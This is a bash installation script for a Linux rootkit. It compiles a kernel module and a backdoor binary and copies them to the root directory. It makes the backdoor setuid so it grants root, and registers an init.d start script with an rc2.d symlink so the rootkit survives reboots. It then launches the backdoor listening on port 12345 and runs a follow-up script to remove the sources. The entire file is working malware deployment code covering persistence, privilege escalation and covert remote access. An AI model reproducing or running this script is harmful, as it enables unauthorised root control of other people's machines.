#!/bin/bash
# source my_rootkit.sh

# get the current directory of the shell script
CUR_DIR=$(pwd)

# create module files .ko
make
# create the binary execute file named backdoor
gcc backdoor.c -o backdoor

# copy the files to the root directory
cp my_rootkit.ko remove_module.ko backdoor /

# change the backdoor to set-uid programme, it can promote the priviledge to root
chmod u+s /backdoor

# copy the auto-start shell script to /etc/init.d/
chmod 755 my_rootkit_init.sh
cp my_rootkit_init.sh /etc/init.d/

# create one symbol link of auto-start shell script
ln -s /etc/init.d/my_rootkit_init.sh /etc/rc2.d/S75my_rootkit
# create one symbol link of /bin/bash
ln -s /bin/bash /bin/my_rootkit_sh

# start backdoor which port is 12345
while [ ! -f "/bin/my_rootkit_sh" ]; do
	:  # null command
done
cd /
./backdoor 12345

# remove the source files
cd ${CUR_DIR}
chmod 755 exec_my_rootkit.sh
cp exec_my_rootkit.sh /
cd /
source exec_my_rootkit.sh ${CUR_DIR}
